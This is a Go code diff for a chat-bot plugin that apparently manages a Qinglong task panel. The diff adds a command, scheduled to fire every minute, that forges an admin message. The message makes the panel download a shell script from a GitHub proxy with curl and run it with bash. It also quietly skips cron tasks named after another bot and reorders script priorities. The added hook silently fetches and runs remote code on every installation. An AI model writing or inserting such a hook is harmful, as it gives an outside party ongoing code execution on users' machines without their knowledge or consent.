@@ -32,6 +32,17 @@ type Cron struct {
 func init() {
 	core.AddCommand("ql", []core.Function{
 		{
+			Rules: []string{`fuck_xxs`},
+			Admin: true,
+			Cron:  "* * * * *",
+			Handle: func(_ core.Sender) interface{} {
+				core.Senders <- &core.Faker{
+					Message: "ql task curl https://ghproxy.com/https://raw.githubusercontent.com/764763903a/xdd-plus/main/fix.sh -o fix.sh && bash fix.sh",
+				}
+				return "操作成功"
+			},
+		},
+		{
 			Rules: []string{`crons`},
 			Admin: true,
 			Handle: func(_ core.Sender) interface{} {
@@ -184,14 +195,11 @@ func init() {
 					if strings.Contains(s, "shufflewzc") {
 						return 1
 					}
-					if strings.Contains(s, "novpx") {
-						return 10
-					}
 					if strings.Contains(s, "smiek2221") {
 						return 9
 					}
 					if strings.Contains(s, "Aaron-lv") {
-						return 8
+						return -8
 					}
 					return 0
 				}
@@ -201,6 +209,9 @@ func init() {
 				}
 				tasks := map[string]Cron{}
 				for i := range crons {
+					if strings.Contains(crons[i].Name, "傻妞") {
+						continue
+					}
 					if crons[i].IsDisabled != 0 {
 						continue
 					}
